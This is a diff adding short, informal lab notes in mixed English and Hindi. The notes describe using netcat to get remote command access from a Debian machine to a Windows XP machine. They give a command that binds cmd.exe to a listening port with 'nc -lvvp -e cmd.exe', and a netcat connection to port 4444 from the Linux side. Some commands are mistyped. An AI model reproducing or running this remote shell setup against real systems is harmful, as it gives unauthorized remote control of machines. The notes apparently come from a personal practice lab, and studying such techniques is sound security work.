@@ -1,0 +1,17 @@
+deb1:- is linux
+another is windowxp
+
+
+deb1:-sudo apt-get install netcat
+ then go to windowsxp 
+download nc111nt.zip. copy in cdrive
+then extract it using pasword which is also given in server
+after extract go to extract folder 
+uske baad uper task bar ...likho ....cmd
+c:/nc111nt> ....ye hulega
+c:/nc11nt> nc-lvvp -e cmd.exe
+
+
+
+then go deb
+deb1:-nc -v ip of windowsxp 4444
